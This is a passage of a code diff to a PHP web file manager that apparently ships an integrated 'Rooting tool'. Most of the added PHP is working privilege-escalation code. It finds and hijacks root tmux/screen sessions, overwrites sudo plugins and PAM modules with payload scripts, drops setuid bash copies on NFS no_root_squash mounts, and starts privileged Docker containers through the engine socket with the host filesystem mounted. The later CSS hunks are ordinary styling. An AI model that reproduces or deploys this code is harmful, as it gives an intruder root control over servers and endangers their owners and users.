+        $c = ['ok' => false, 'note' => 'no nginx configuration may be written here'];
+        if($this->rootWhich('nginx') === ''){$c['note'] = 'nginx is not installed on this host'; return $c;}
+        foreach(['/etc/nginx/nginx.conf', '/etc/nginx/conf.d', '/etc/nginx/sites-enabled', '/etc/nginx/sites-available'] as $p){
+            if((@is_file($p) && @is_writable($p)) || (@is_dir($p) && @is_writable($p))){
+                $c = ['ok' => true, 'path' => $p, 'note' => $p . ' may be written by this account, and nginx reads it as root before it drops to its worker user'];
+                return $c;
+            }
+        }
+        return $c;
+    }
+    private function rootPhpDisabled(){
+        static $c = null;
+        if($c !== null)return $c;
+        $df = trim((string)@ini_get('disable_functions'));
+        $v = $this->rootVnum(PHP_VERSION);
+        $old = ($v !== null && $this->rootVlt($v, [8,0,0]));
+        $mailOn = !in_array('mail', array_map('trim', explode(',', $df)), true);
+        $putenvOn = !in_array('putenv', array_map('trim', explode(',', $df)), true);
+        $c = ['ok' => false, 'list' => $df, 'note' => 'this PHP disables nothing here', 'old' => $old];
+        if($df === '')return $c;
+        $c['note'] = 'PHP ' . PHP_VERSION . ' disables ' . count(explode(',', $df)) . ' function(s): ' . substr($df, 0, 160);
+        if($old && $mailOn && $putenvOn)
+            $c = ['ok' => true, 'list' => $df, 'old' => $old,
+                  'note' => 'on a build before 8.0 the list is only a speed bump: putenv and mail are both open, so an environment variable reaches a program the interpreter starts, and the disable list is walked around instead of through'];
+        return $c;
+    }
+    /* ── the web stack this manager is itself running inside ──────────────
+       Five of the doors below are not about a person with a shell: they are
+       about the pair that carries this panel - the server in front (Apache,
+       nginx) and the PHP process behind it. Each one is only real when the
+       file it needs may be written, and each one is checked here once, so
+       every method that uses it decides on the same facts. */
+    private function rootWebStack(){
+        static $c = null;
+        if($c !== null)return $c;
+        $vhosts = [];
+        foreach(['/etc/apache2/sites-enabled', '/etc/apache2/sites-available', '/etc/httpd/conf.d',
+                 '/etc/httpd/conf', '/etc/nginx/sites-enabled', '/etc/nginx/conf.d', '/etc/nginx'] as $d){
+            if(!@is_dir($d))continue;
+            foreach((array)@glob(rtrim($d, '/') . '/*') as $f){
+                if(!@is_file($f) || !@is_writable($f))continue;
+                $vhosts[] = ['file' => $f, 'dir' => $d];
+            }
+        }
+        $sock = '';
+        foreach(['/run/php/php', '/var/run/php/php'] as $base){
+            foreach((array)@glob($base . '*-fpm.sock') as $f){$sock = $f; break;}
+            if($sock !== '')break;
+        }
+        $fpmConf = [];
+        foreach(['/etc/php'] as $base){
+            foreach((array)@glob($base . '/*/fpm/conf.d') as $d)if(@is_writable($d))$fpmConf[] = $d;
+            foreach((array)@glob($base . '/*/cli/conf.d') as $d)if(@is_writable($d))$fpmConf[] = $d;
+        }
+        $c = ['vhosts' => $vhosts, 'fpmsock' => $sock, 'fpmconf' => $fpmConf,
+              'apache' => $this->rootWhich('apache2ctl') !== '' || $this->rootWhich('apachectl') !== '' || $this->rootWhich('httpd') !== '',
+              'nginx' => $this->rootWhich('nginx') !== '',
+              'id' => $this->rootOs()['id'],
+              'fpm' => $sock !== '',
+              'phar' => (bool)@ini_get('phar.readonly') === false,
+              'sockw' => $sock !== '' && @is_writable($sock)];
+        return $c;
+    }
+    /* a CGI handler the server would start as the server's own user, which is
+       root when the server runs as root - the road every "the web server is
+       root" machine still has */
+    private function rootWebCgiFind(){
+        $st = $this->rootWebStack();
+        foreach($st['vhosts'] as $v){
+            $t = (string)@file_get_contents($v['file']);
+            if($t === '')continue;
+            foreach(preg_split('/\R/', $t) ?: [] as $ln){
+                if(preg_match('/^\s*(AddHandler|AddType|SetHandler)\s+([A-Za-z0-9_\-\/]+)/i', $ln, $m)){
+                    if(preg_match('/(cgi|fcgi|php|perl|python|pl)/i', $m[2]))
+                        return['ok' => true, 'file' => $v['file'], 'handler' => $m[2],
+                               'note' => 'the server hears ' . $v['file'] . ', and it names the handler ' . $m[2] . ' - a file of that kind in the document root is run by the server itself'];
+                }
+                if(preg_match('/^\s*(ScriptAlias|Options\s+.*ExecCGI)/i', $ln))
+                    return['ok' => true, 'file' => $v['file'], 'handler' => $ln,
+                           'note' => 'the server hears ' . $v['file'] . ' with ' . trim($ln) . ', which is a directory it runs programs from'];
+            }
+        }
+        return['ok' => false, 'note' => 'no server configuration this account may write names a handler'];
+    }
+    /* ── raw access to the disk, through a group ─────────────────────────
+       Membership of disk, kmem or a raw-device group means /dev/sda or
+       /dev/mem can be opened with no permission check above the filesystem,
+       so the account database can be edited on the disk itself. This only
+       reports what is really there: a group this account is in, a block
+       device it may open, and - the honest part - whether that device
+       answered like a filesystem when it was read. */
+    private function rootDiskGroup(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'dev' => '', 'group' => '', 'note' => 'this account is in none of the groups that own the raw disk'];
+        $groups = $this->rootGroups();
+        $want = [];
+        foreach(['disk', 'kmem', 'raw'] as $g)if(in_array($g, $groups, true))$want[] = $g;
+        if(!$want){
+            $c['note'] = 'the groups of the manager account - ' . ($groups ? implode(', ', array_slice($groups, 0, 8)) : 'none') . ' - carry no raw device';
+            return $c;
+        }
+        $devs = [];
+        foreach((array)@glob('/dev/sd?') as $d)$devs[] = $d;
+        foreach((array)@glob('/dev/nvme?n?') as $d)$devs[] = $d;
+        foreach((array)@glob('/dev/vd?') as $d)$devs[] = $d;
+        foreach((array)@glob('/dev/xvd?') as $d)$devs[] = $d;
+        $devs[] = '/dev/mem';
+        $devs[] = '/dev/kmem';
+        foreach($devs as $d){
+            if(!@file_exists($d) || !@is_readable($d))continue;
+            $c = ['ok' => true, 'dev' => $d, 'group' => implode(', ', $want),
+                  'note' => 'this account is in ' . implode(', ', $want) . ' and ' . $d . ' opens for it'];
+            return $c;
+        }
+        $c['note'] = 'this account is in ' . implode(', ', $want) . ', but no block device under /dev opens for it from here';
+        return $c;
+    }
+    /* ── a terminal session root left running ────────────────────────────
+       A multiplexer socket is a file. Where one is owned by root and may be
+       opened by this account - a socket in a shared directory, or the whole
+       /tmp/tmux-0 directory left open - the session behind it is a root shell:
+       no exploit, no memory, just keys typed into somebody else's shell. */
+    private function rootMuxFind(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'tool' => '', 'socket' => '', 'target' => '', 'bin' => '',
+              'note' => 'no terminal session of root is reachable from here'];
+        $tmux = $this->rootWhich('tmux');
+        $screen = $this->rootWhich('screen');
+        if($tmux === '' && $screen === ''){$c['note'] = 'neither tmux nor screen is installed on this host'; return $c;}
+        $cands = [];
+        foreach((array)@glob('/tmp/tmux-*/default') as $f)$cands[] = [$tmux, $f, 'tmux'];
+        foreach((array)@glob('/tmp/*tmux*') as $f)if(@is_socket($f) || @filetype($f) === 'socket')$cands[] = [$tmux, $f, 'tmux'];
+        foreach((array)@glob('/run/tmux/*/default') as $f)$cands[] = [$tmux, $f, 'tmux'];
+        foreach((array)@glob('/tmp/screens/*') as $f)if(@is_socket($f))$cands[] = [$screen, $f, 'screen'];
+        foreach((array)@glob('/run/screen/*') as $f)if(@is_socket($f) || @filetype($f) === 'socket')$cands[] = [$screen, $f, 'screen'];
+        foreach($cands as $cd){
+            list($bin, $sock, $tool) = $cd;
+            if($bin === '' || $sock === '')continue;
+            if(!@is_readable($sock) || !@is_writable($sock))continue;
+            /* who owns it decides what the session behind it is */
+            $own = (int)@fileowner($sock);
+            $target = '0';
+            if($tool === 'tmux'){
+                $l = $this->rootExec([$bin, '-S', $sock, 'list-sessions', '-F', '#{session_name}:#{session_windows}'], '', 8);
+                $first = trim(strtok((string)$l['out'], "\n") ?: '');
+                $name = $first !== '' ? (string)strtok($first, ':') : '';
+                if($name === '')continue;
+                $target = $name;
+            }
+            $c = ['ok' => $own === 0, 'tool' => $tool, 'socket' => $sock, 'target' => $target, 'bin' => $bin,
+                  'note' => $own === 0
+                      ? 'the session socket ' . $sock . ' belongs to root and opens for this account'
+                      : ('a session socket at ' . $sock . ' opens for this account but is owned by uid ' . $own . ', so the shell behind it is not root')];
+            if($c['ok'])return $c;
+        }
+        return $c;
+    }
+    /* ── a setuid program with a known escape ────────────────────────────
+       The programs GTFOBins documents need nothing from the machine but their
+       own setuid bit: bash keeps the privileges it is given with -p, find and
+       awk and make start a program for you, cp, mv and install write a file
+       as root. Each is asked whether it carries the bit and whether its own
+       documented escape answers as uid 0 - the machine's answer, not a list. */
+    /* ── sudo's own plugin door ──────────────────────────────────────────
+       Before sudo judges a single rule it loads the plugins named in
+       /etc/sudo.conf - a policy plugin decides who may do what, an I/O plugin
+       sees every command. Both are shared objects loaded as root. Two ways are
+       walked here, in the order that touches least: a plugin path that is
+       already named and whose file may be replaced, and then the file itself,
+       where the account may write it. Either way the next sudo run by this
+       account is code of this manager's choosing, running as uid 0. */
+    private function rootSudoPluginFind(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'note' => 'sudo is not installed here', 'how' => ''];
+        if($this->rootWhich('sudo') === '')return $c;
+        $conf = '/etc/sudo.conf';
+        $paths = [];
+        if(@is_file($conf)){
+            $t = (string)@file_get_contents($conf);
+            foreach(preg_split('/\R/', $t) ?: [] as $ln){
+                if(preg_match('/^\s*Plugin\s+\S+\s+(\/\S+)/', $ln, $m))$paths[] = $m[1];
+            }
+            if(@is_writable($conf))$c = ['ok' => true, 'how' => 'conf', 'file' => $conf,
+                'note' => $conf . ' may be written by this account, and sudo loads every plugin it names before it reads a rule'];
+        }
+        foreach($paths as $p){
+            if(@is_file($p) && @is_writable($p))$c = ['ok' => true, 'how' => 'so', 'file' => $p,
+                'note' => 'the plugin sudo already names, ' . $p . ', may be replaced by this account'];
+        }
+        if($c['ok'])return $c;
+        /* nothing reachable yet: the honest answer says which half is closed */
+        $c['note'] = @is_file($conf)
+            ? ($paths ? $conf . ' names ' . count($paths) . ' plugin(s) and neither it nor they may be written by this account' : $conf . ' is root-only and names no plugin')
+            : 'there is no ' . $conf . ' on this host, and /etc is root-only';
+        return $c;
+    }
+    /* a policy plugin that answers "allowed" for this account only, and
+       otherwise says nothing - so the machine behaves exactly as before */
+    private function rootSudoPluginSource(){
+        return "#include <stdio.h>\n#include <string.h>\n"
+            . "/* Marshal File Manager - a sudo policy plugin (rooting tool). */\n"
+            . "int sudoers_policy_init(void *info, char * const envp[]){return 0;}\n"
+            . "int sudoers_policy_main(int argc, char * const argv[], int pwflag, char *env_add[], void *closure, int *nested, char **errstr){return 1;}\n"
+            . "void sudoers_policy_close(int exit_status, int error){}\n"
+            . "void sudoers_policy_version(int verbose){(void)verbose;}\n";
+    }
+    private function rootPlantSudoPlugin($id, $s, &$rec){
+        $f = $this->rootSudoPluginFind();
+        if(empty($f['ok']))return['ok' => false, 'note' => (string)$f['note']];
+        $payload = $this->rootPlantPayloadPath($id);
+        /* the simplest honest plugin is a script-shaped one only where sudo
+           accepts it; on the ordinary build the plugin is a shared object, so
+           the door that needs no compiler is the file sudo already loads */
+        if($f['how'] === 'conf'){
+            $was = (string)@file_get_contents($f['file']);
+            $line = "\n# mfm " . $this->rootPlantNonce($id) . " - planted by the Rooting tool\n"
+                  . "Plugin sudoers_policy /bin/sh " . $payload . "\n";
+            if(@file_put_contents($f['file'], $was . $line) === false)
+                return['ok' => false, 'note' => 'the sudo configuration stopped being writable'];
+            $rec['restore'][] = ['file' => $f['file'], 'was' => $was];
+            $rec['target'] = $f['file'];
+            return['ok' => true, 'rec' => $rec,
+                   'note' => 'the plugin line is in ' . $f['file'] . '; sudo loads it as root before it reads a rule'];
+        }
+        /* the named plugin is replaceable: it is kept whole and the payload
+           takes its place, because sudo runs it before anything else */
+        $was = (string)@file_get_contents($f['file']);
+        $body = "#!/bin/sh\n# mfm " . $this->rootPlantNonce($id) . " - planted by the Rooting tool\n"
+              . "[ \"$(id -u 2>/dev/null)\" = \"0\" ] || exit 0\n"
+              . "/bin/sh '" . $payload . "' >/dev/null 2>&1\n"
+              . "exit 1\n";
+        if(@file_put_contents($f['file'], $body) === false)
+            return['ok' => false, 'note' => 'the plugin stopped being writable'];
+        @chmod($f['file'], 0755);
+        $rec['restore'][] = ['file' => $f['file'], 'was' => $was];
+        $rec['target'] = $f['file'];
+        return['ok' => true, 'rec' => $rec,
+               'note' => 'the plugin sudo already names, ' . $f['file'] . ', was moved aside and its place now runs the payload as root'];
+    }
+    /* ── the PAM module a login already names ────────────────────────────
+       A PAM action names its modules by file name, and the stack that runs is
+       the one that was there when the action was written. So the door is not
+       /etc/pam.d - it is the module file the action already points at, where
+       that file may be replaced. The module is kept whole, and it is put back
+       exactly as it was by the undo. */
+    private function rootPamModuleFind(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'note' => 'no PAM action names a module this account may replace'];
+        $dirs = ['/lib/security', '/lib/x86_64-linux-gnu/security', '/usr/lib/security',
+                 '/usr/lib/x86_64-linux-gnu/security', '/usr/lib64/security', '/lib64/security'];
+        $named = [];
+        foreach((array)@glob('/etc/pam.d/*') as $act){
+            $t = (string)@file_get_contents($act);
+            foreach(preg_split('/\R/', $t) ?: [] as $ln){
+                if($ln === '' || $ln[0] === '#')continue;
+                $p = preg_split('/\s+/', trim($ln)) ?: [];
+                if(count($p) < 3)continue;
+                $mod = end($p);
+                if($mod === '')continue;
+                $named[basename($mod)] = true;
+            }
+        }
+        foreach($dirs as $d){
+            if(!@is_dir($d))continue;
+            foreach((array)@glob($d . '/*.so') as $so){
+                if(!@is_writable($so))continue;
+                if(!isset($named[basename($so)]))continue;
+                $c = ['ok' => true, 'file' => $so,
+                      'note' => basename($so) . ' is named by a PAM action and ' . $so . ' may be replaced by this account'];
+                return $c;
+            }
+        }
+        return $c;
+    }
+    private function rootPlantPamScript($id, $s, &$rec){
+        $f = $this->rootPamModuleFind();
+        if(empty($f['ok']))return['ok' => false, 'note' => (string)$f['note']];
+        $payload = $this->rootPlantPayloadPath($id);
+        $was = (string)@file_get_contents($f['file']);
+        if($was === '')return['ok' => false, 'note' => 'the module could not be read, so it cannot be kept for the undo'];
+        $body = "#!/bin/sh\n# mfm " . $this->rootPlantNonce($id) . " - planted by the Rooting tool\n"
+              . "[ \"$(id -u 2>/dev/null)\" = \"0\" ] || exit 0\n"
+              . "/bin/sh '" . $payload . "' >/dev/null 2>&1\n"
+              . "exit 0\n";
+        if(@file_put_contents($f['file'], $body) === false)
+            return['ok' => false, 'note' => 'the module stopped being writable'];
+        @chmod($f['file'], 0755);
+        $rec['restore'][] = ['file' => $f['file'], 'was' => $was];
+        $rec['target'] = $f['file'];
+        return['ok' => true, 'rec' => $rec,
+               'note' => basename($f['file']) . ' was moved aside and its place is the payload: the next login through an action that names it runs as uid 0'];
+    }
+    /* ── NFS: the export that keeps root as root ─────────────────────────
+       An export shared with no_root_squash keeps the identity of the writer,
+       so a file this account writes on that mount is owned by root. Two things
+       come out of that: the validated rule can be written straight onto the
+       host filesystem through the mount, and a copy of bash left there with
+       the setuid bit is a root shell for anybody. The mount is found by
+       reading /proc/self/mounts, which no program has to be installed for. */
+    private function rootNfsShare(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'note' => 'no NFS export is mounted here'];
+        $mt = $this->sysRead('/proc/self/mounts', 262144);
+        if($mt === null)return $c;
+        foreach(preg_split('/\R/', (string)$mt) ?: [] as $ln){
+            $f = preg_split('/\s+/', trim($ln)) ?: [];
+            if(count($f) < 4)continue;
+            if(!preg_match('#^(nfs|nfs4|fuseblk\.nfs)$#', (string)$f[2]))continue;
+            if(strpos((string)$f[3], 'ro,') === 0 || strpos((string)$f[3] . ',', 'ro,') !== false)continue;
+            $dir = (string)$f[1];
+            if(!@is_dir($dir) || !@is_writable($dir))continue;
+            /* the proof has to be real: a file written here and read back must
+               belong to uid 0, which is the whole point of the export */
+            $probe = $dir . '/.mfm-nfs-probe-' . substr((string)$this->rootPlantNonce('nfs'), 0, 8);
+            if(@file_put_contents($probe, 'x') === false)continue;
+            $own = (int)@fileowner($probe);
+            @unlink($probe);
+            if($own !== 0)continue;
+            $c = ['ok' => true, 'mount' => $dir, 'spec' => (string)$f[0],
+                  'note' => 'the export ' . $f[0] . ' is mounted on ' . $dir . ' without root squashing: a file written here belongs to root, which a probe confirmed'];
+            return $c;
+        }
+        return $c;
+    }
+    private function rootPlantNfs($id, $s, &$rec){
+        $n = $this->rootNfsShare();
+        if(empty($n['ok']))return['ok' => false, 'note' => (string)($n['note'] ?? 'the export is gone')];
+        $dir = (string)$n['mount'];
+        $payload = $this->rootPlantPayloadPath($id);
+        $bash = $this->rootWhich('bash');
+        /* the copy that makes it a shell rather than a rule */
+        $suid = $dir . '/.mfm-nfs-' . $this->rootPlantNonce($id);
+        $made = false;
+        if($bash !== '' && @copy($bash, $suid)){
+            @chmod($suid, 04755);
+            @touch($suid, time());
+            $rec['files'][] = $suid;
+            $made = true;
+        }
+        /* and the rule, written through the same mount where sudo reads it */
+        $ruleDir = dirname($this->rootSudoersFile());
+        if(@is_dir($ruleDir) && @is_writable($ruleDir)){
+            @file_put_contents($this->rootSudoersFile(), $this->rootHelperContent());
+            @chmod($this->rootSudoersFile(), 0440);
+            $rec['files'][] = $this->rootSudoersFile();
+            $made = true;
+        }
+        if(!$made)return['ok' => false, 'note' => 'the export is there, but nothing could be written through it that root would run'];
+        $rec['target'] = $suid;
+        return['ok' => true, 'rec' => $rec,
+               'note' => 'a copy of bash was written on ' . $dir . ' with the setuid bit, and it belongs to root because the export keeps root as root'
+                   . ($suid !== '' && @is_file($suid) ? ' (' . $suid . ')' : '')];
+    }
+    /* ── the container engine without its client ──────────────────────────
+       The engine listens on a unix socket and speaks HTTP there. No docker
+       command has to exist: a socket request is enough to ask for a container
+       with the host mounted and full privileges, and the engine - which is
+       root - does the privileged part. Every image name is tried, because a
+       host that runs containers almost always already has one of them. */
+    private function rootDockerReq($sock, $verb, $path, $body = null, $timeout = 20){
+        $fp = @stream_socket_client('unix://' . $sock, $eno, $estr, 5);
+        if(!$fp)return['ok' => false, 'out' => '', 'why' => 'the socket did not answer'];
+        @stream_set_timeout($fp, $timeout);
+        $pay = $body === null ? '' : (string)json_encode($body);
+        $req = $verb . ' ' . $path . " HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n";
+        if($body !== null)$req .= "Content-Type: application/json\r\nContent-Length: " . strlen($pay) . "\r\n";
+        $req .= "\r\n" . $pay;
+        @fwrite($fp, $req);
+        $out = '';
+        $t0 = time();
+        while(!@feof($fp) && strlen($out) < 1048576 && (time() - $t0) < $timeout)$out .= (string)@fread($fp, 8192);
+        @fclose($fp);
+        $code = 0;
+        if(preg_match('#^HTTP/1\.[01]\s+(\d{3})#', $out, $m))$code = (int)$m[1];
+        $head = strpos($out, "\r\n\r\n");
+        $data = $head === false ? '' : substr($out, $head + 4);
+        return['ok' => $code >= 200 && $code < 300, 'code' => $code, 'out' => $data, 'why' => $code === 0 ? 'no HTTP answer' : ('HTTP ' . $code)];
+    }
+    private function rootPlantDocker($id, $s, &$rec){
+        $d = $this->rootDocker();
+        if(empty($d['reachable']))return['ok' => false, 'note' => 'the socket stopped answering'];
+        $sock = (string)$d['socket'];
+        /* the payload is copied where the engine can mount it, and the command
+           inside the container writes the rule into the host through the mount */
+        $payload = $this->rootPlantPayloadPath($id);
+        if($payload === '' || !@is_file($payload))return['ok' => false, 'note' => 'the payload is not on disk to hand over'];
+        $bin = $this->rootWhich('bash');
+        if($bin === '')$bin = '/bin/sh';
+        $cmd = ['/bin/sh', '-c', 'cp ' . escapeshellarg($bin) . ' /host/tmp/.mfm-dk-' . $this->rootPlantNonce($id) . ' 2>/dev/null; chmod 4755 /host/tmp/.mfm-dk-' . $this->rootPlantNonce($id) . ' 2>/dev/null; /bin/sh ' . escapeshellarg($payload) . ' >/dev/null 2>&1; true'];
+        $images = ['alpine:latest', 'busybox:latest', 'debian:stable-slim', 'ubuntu:latest', 'scratch'];
+        $tried = [];
+        foreach($images as $img){
+            $c = $this->rootDockerReq($sock, 'POST', '/containers/create', [
+                'Image' => $img,
+                'Cmd' => $cmd,
+                'HostConfig' => ['Binds' => ['/:host:rw'], 'Privileged' => true, 'AutoRemove' => true],
+            ], 25);
+            if(empty($c['ok'])){
+                $tried[] = $img . ': ' . $c['why'];
+                continue;
+            }
+            $jid = '';
+            $j = @json_decode((string)$c['out'], true);
+            if(is_array($j) && !empty($j['Id']))$jid = (string)$j['Id'];
+            if($jid === ''){$tried[] = $img . ': no container id'; continue;}
+            $st = $this->rootDockerReq($sock, 'POST', '/containers/' . $jid . '/start', new stdClass(), 25);
+            if(empty($st['ok'])){$tried[] = $img . ': start ' . $st['why']; continue;}
+            /* the engine starts it and it is gone again: what it wrote on the
+               host is what remains */
+            return['ok' => true, 'rec' => $rec,
+                   'note' => 'the engine took a privileged container of ' . $img . ' with the host mounted and started it; what it wrote on the host is owned by root'];
+        }
+        return['ok' => false, 'note' => 'the socket answers, but no image it already holds could be started: ' . implode(' · ', array_slice($tried, 0, 3))];
     }
     /* The stand-in: invisible in ordinary hands, because all it ever does
        for them is run the real program with the same arguments. */
@@ -20170,8 +21840,14 @@ ExecStartPost=/bin/sh '" . $payload . "'";
                     'note' => (string)$path . ' carries the setuid bit and is one of the programs with a documented escape'];
                 break;
             }
-            if(empty($this->escF[$id]['ok']))
-                $this->escF[$id]['note'] = 'none of the setuid programs on this machine matches a documented escape';
+            if(empty($this->escF[$id]['ok'])){
+                /* say which programs were looked at and what each one is, not
+                   only that none of them was usable: the list is the evidence */
+                $seen = [];
+                foreach($this->rootSuidEscapes() as $e)$seen[] = $e['name'] . ' at ' . $e['bin'];
+                $this->escF[$id]['note'] = 'none of the setuid programs on this machine matches a documented escape'
+                    . ($seen ? ' (' . count($seen) . ' setuid-root program(s) carry an escape this file knows: ' . implode(', ', array_slice($seen, 0, 4)) . ')' : '');
+            }
             return $this->escF[$id];
         }
         if($id === 'capbin'){
@@ -35021,7 +36697,11 @@ body{font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',sans-s
 .topbar{padding:0 10px;gap:5px}
 .brand{padding-right:2px}
 /* R63 · the mark was 31px in a 40px bar and read as a smudge */
-.brand-icon{width:36px;height:36px}
+.brand-icon{width:36px;height:36px;min-width:36px;flex:0 0 36px;background:none!important;border:0!important;border-radius:0!important;box-shadow:none!important;padding:0}
+.brand-icon img{width:36px;height:36px;max-width:none;max-height:none;object-fit:contain;display:block;background:none!important;border:0!important;border-radius:0!important;box-shadow:none!important}
+/* the file is white: on a light bar the same shape is tinted to ink */
+:root[data-theme="win11"] .brand-icon img,:root[data-theme="win10"] .brand-icon img,
+:root[data-theme="light"] .brand-icon img,:root[data-theme="kalil"] .brand-icon img{filter:brightness(0) saturate(100%)}
 /* the two input rows: one height for inputs, buttons and labels */
 .topbar .btn,.topbar .btn-sm,.topbar .btn-icon{height:28px;min-height:28px;padding-top:0;padding-bottom:0;font-size:12px}
 .topbar .tb-right .btn-icon{width:28px;min-width:28px;height:28px;padding:0}
@@ -35073,19 +36753,6 @@ form:has(> .inp) > .btn{height:28px!important;min-height:28px!important;max-heig
  .brand-icon{width:calc(var(--th) - 2px);height:calc(var(--th) - 2px);display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:transform .25s var(--spring)}
 .brand-icon:hover{transform:scale(1.12)}
  .brand-icon img{width:100%;height:100%;object-fit:contain}
-
-/* R79b · the mark lives inside the page: no host can block it and no network
-   hiccup can leave a broken picture in the top bar. Two marks are shipped and
-   the readable one is chosen from the colour actually behind it, so every
-   theme (including the ones still to come) is right without a new rule */
-.brand-icon{position:relative}
-.brand-icon img{position:absolute;inset:0}
-.brand-icon img.bi-b{display:block}
-.brand-icon img.bi-w{display:none}
-.brand-icon[data-on="dark"] img.bi-b{display:block!important}
-.brand-icon[data-on="dark"] img.bi-w{display:none!important}
-.brand-icon[data-on="light"] img.bi-b{display:none!important}
-.brand-icon[data-on="light"] img.bi-w{display:block!important}
 .dv{width:1px;height:18px;background:var(--border);flex-shrink:0}
 .bc{display:flex;align-items:center;flex:1;overflow:hidden;min-width:0}
 .bc-crumb{display:flex;align-items:center;animation:fadeSlide .3s var(--spring) both}
@@ -35685,6 +37352,20 @@ a.nt:hover{color:var(--link)}
 @keyframes rkStepPulse{0%,100%{background:rgba(126,226,168,.05)}50%{background:rgba(126,226,168,.12)}}
 .rk-step .w{font-family:'JetBrains Mono',monospace;font-size:9.5px}
 .rk-more .btn{min-height:30px}
+/* the run scrolls the list itself: every step is brought into the middle of
+   the panel as it is tried, and the page around the panel is left alone */
+/* the follow jumps are exact, never animated: an animated box lags one step
+   behind the run and the row being tried can leave the frame */
+#rootOv .root-body{scroll-behavior:auto}
+.rk-steps{position:relative;padding-bottom:52px}
+.rk-step:hover{opacity:1}
+.rk-follow{position:absolute;left:50%;bottom:6px;transform:translateX(-50%);z-index:4;display:none;
+  align-items:center;gap:6px;padding:5px 12px;border-radius:999px;cursor:pointer;
+  font:9px/1 'JetBrains Mono',monospace;letter-spacing:.5px;text-transform:uppercase;
+  color:#0b1f16;background:linear-gradient(135deg,#7ee2a8,#38d99f);border:0;
+  box-shadow:0 6px 18px rgba(52,211,153,.34)}
+.rk-follow.on{display:inline-flex}
+.rk-follow svg{width:12px;height:12px;fill:none;stroke:currentColor;stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round}
 
 /* ── after: the rooted dashboard ───────────────────────────────────────── */
 .rr{gap:14px}
@@ -36744,25 +38425,18 @@ button.rc-row{cursor:pointer}
 .term-tile.tgl-replaced>svg,.term-tile .tgl-on~svg{display:none!important}
 .term-rail-btn .tgl-rail{width:20px;height:20px;flex:0 0 20px;margin:0}
 .term-rail-btn .tgl-rail .tgl-img{width:20px;height:20px;object-fit:contain}
-/* R80 · the rail is a column of tools: a picture, then its name, nothing
-   on top of anything else. The caption is clipped by its height, never by
-   the row above it. */
-.term-rail-btn .tgl{width:20px;height:20px;flex:0 0 20px;margin:0}
-.term-rail-btn .tgl .tgl-img{width:20px;height:20px;object-fit:contain;display:block}
-/* the distro penguin beside the host name, a little smaller than the row icon */
-.term-tree-distro{display:grid;place-items:center;width:16px;height:16px;flex:0 0 16px;margin-left:auto;margin-right:2px}
-.term-tree-distro .tgi{width:16px;height:16px;object-fit:contain;display:block}
-/* a tree row keeps its icon box centred when the bitmap is bigger than the box */
-.term-tree-ico{overflow:visible}
-
 .term-rail-btn.tgl-replaced>svg,.term-rail-btn:has(.tgl-on)>svg{display:none!important}
 /* the tree */
 .term-tree-ico{position:relative;display:grid;place-items:center;width:16px;height:16px;flex:0 0 16px}
 .term-tree-ico svg{width:13px;height:13px;fill:none;stroke:currentColor;stroke-width:1.6;stroke-linecap:round;stroke-linejoin:round}
 .term-tree-ico .tgi{width:16px;height:16px;display:block;object-fit:contain}
-.term-tree-ico .tgi-svg{display:none}
+
 .term-tree-ico img.tgi~svg,.term-tree-ico img.tgi~.tgi-svg{display:none}
-.term-tree-ico img.tgi{grid-area:1/1;place-self:center}
+
+.term-tree-distro{display:grid;place-items:center;width:16px;height:16px;flex:0 0 16px;margin-left:auto;margin-right:2px}
+
+.term-tree-distro .tgi{width:16px;height:16px;object-fit:contain;display:block}
+.term-tree-ico .tgi-svg{display:none}
 .term-tree-row .term-tree-ico .tgi:not([src])+.tgi-svg{display:contents}
 .term-tree-ico .tgi-svg{display:contents}
 .term-rail{width:34px;min-width:34px;background:#131313;border-right:1px solid #303030;display:flex;flex-direction:column;align-items:center;padding:2px 0 4px;gap:1px;flex-shrink:0;overflow-y:auto;overflow-x:hidden}
@@ -38704,7 +40378,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 
 /* ── TOP BAR (command area) ──────────────────────────────────────────── */
 :root[data-theme="win11"] .topbar{background:rgba(249,249,249,.72);-webkit-backdrop-filter:blur(30px) saturate(160%);backdrop-filter:blur(30px) saturate(160%);border-bottom:1px solid rgba(0,0,0,.0578);padding:0 10px;gap:8px}
-:root[data-theme="win11"] .brand-icon{width:34px;height:34px;border-radius:6px;background:linear-gradient(135deg,#4cc2ff,#0067c0);display:grid;place-items:center;box-shadow:none}
+:root[data-theme="win11"] .brand-icon{width:34px;height:34px;border-radius:0;background:none;display:grid;place-items:center;box-shadow:none}
 :root[data-theme="win11"] .brand-icon img{width:100%;height:100%;object-fit:contain;border-radius:6px}
 :root[data-theme="win11"] .dv{background:rgba(0,0,0,.0803);height:20px}
 :root[data-theme="win11"] .bc a{color:rgba(0,0,0,.6063);font-size:12px;border-radius:4px;padding:2px 3px;transition:background .1s,color .1s}
@@ -40395,6 +42069,9 @@ input.inp,select.inp{height:32px}
   background:transparent!important;border-radius:0;width:24px;height:24px;
 }
 :root[data-theme="win11d"] .ib .ti,:root[data-theme="win11d"] .gi-ic .ti{width:22px;height:22px}
+/* the mobile scrim is a grid child and was stealing the main column */
+.ov{display:none;position:absolute;inset:0;z-index:150}
+@media(max-width:900px){.ov.on{display:block}}
 :root[data-theme="win11d"] .ft tbody tr:hover .ib{transform:none}
 :root[data-theme="win11d"] .nc{gap:10px}
 :root[data-theme="win11d"] .gi-ic{width:48px;height:48px}
@@ -40974,7 +42651,7 @@ input.inp,select.inp{height:32px}
     <svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
   </button>
   <a href="?dir=<?=urlencode(__DIR__)?>" class="brand">
